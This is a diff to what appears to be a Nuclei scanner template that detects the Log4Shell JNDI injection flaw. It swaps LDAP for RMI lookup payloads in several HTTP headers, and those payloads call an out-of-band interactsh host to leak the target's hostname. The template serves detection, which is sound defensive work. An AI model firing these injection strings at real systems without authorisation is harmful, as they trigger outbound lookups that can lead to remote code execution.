@@ -16,11 +16,13 @@ requests:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-        X-Api-Version: ${jndi:ldap://${hostName}.{{interactsh-url}}/badClassName}
-        Referer: ${jndi:ldap://${hostName}.{{interactsh-url}}/badClassName}
-        X-Forwarded-For: ${jndi:ldap://${hostName}.{{interactsh-url}}/badClassName}
-        Authentication: ${jndi:ldap://${hostName}.{{interactsh-url}}/badClassName}
-        User-Agent: ${jndi:ldap://${hostName}.{{interactsh-url}}/badClassName}
+        User-Agent: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+        X-Api-Version: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+        Referer: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+        X-Forwarded-For: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+        Authentication: ${jndi:rmi://${hostName}.{{interactsh-url}}}
+
+
 
 
     matchers-condition: and
@@ -40,4 +42,4 @@ requests:
         part: interactsh_request
         group: 1
         regex:
-          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in outputEOF
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
